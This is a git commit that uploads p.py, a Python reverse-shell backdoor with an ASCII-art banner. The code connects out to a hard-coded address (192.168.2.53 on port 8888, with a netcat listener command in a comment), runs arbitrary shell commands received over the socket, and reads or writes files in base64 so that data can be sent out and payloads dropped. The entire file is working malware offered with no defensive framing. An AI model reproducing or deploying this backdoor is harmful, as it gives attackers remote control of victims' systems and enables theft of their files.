dd4462d4fa27e99978cf447a646f4427b17f1f19
Dharsun <93769857+Dharsun@users.noreply.github.com>
2021-11-23 16:55:14 +0530

    Add files via upload

---
+++ p.py
@@ -0,0 +1,92 @@
+#!usr/bin/env python
+#nc -vv -l -p 8888
+
+
+import socket
+import subprocess
+import json
+import os
+import base64
+
+
+print ("""
+     ____    _   _      _      ____    ____    _   _   _   _  
+    |  _ \  | | | |    / \    |  _ \  / ___|  | | | | | \ | | 
+    | | | | | |_| |   / _ \   | |_) | \___ \  | | | | |  \| | 
+    | |_| | |  _  |  / ___ \  |  _ <   ___) | | |_| | | |\  | 
+    |____/  |_| |_| /_/   \_\ |_| \_\ |____/   \___/  |_| \_| 
+    
+    
+    
+                                  ______   
+	                       .-        -. 
+	                      /            \         
+	                     |,  .-.  .-.  ,|      
+	                     | )(_ /  \_ )( |
+	                     |/     /\     \|    
+	           (@_       <__    ^^    __>        
+	      _     ) \_______\__|IIIIII|__/____________________/\ 
+	     (_)\@8@8{}<_________________________________________/ 
+	            )_/         \ IIIIII /                    
+	           (@            --------                      
+		  \n\n""")
+
+
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def execute_system_commands(self, command):
+        return subprocess.check_output(command, shell=True)
+
+    def changing_dir(self, path):
+        os.chdir(path)
+        return "[+] Changing Working Directory to " + path
+
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Upload Successful"
+
+    def run(self):
+        while True:
+            command = self.reliable_receive()
+            try:
+                if command[0] == "exit":
+                    self.connection.close()
+                    exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    command_result = self.changing_dir(command[1])
+                elif command[0] == "download":
+                    command_result = self.read_file(command[1])
+                elif command[0] == "upload":
+                    command_result = self.write_file(command[1], command[2])
+                else:
+                    command_result = self.execute_system_commands(command)
+            except Exception:
+                command_result = "[-] Error during command execution"
+            self.reliable_send(command_result)
+
+
+
+
+my_backdoor = Backdoor("192.168.2.53", 8888)
+my_backdoor.run()
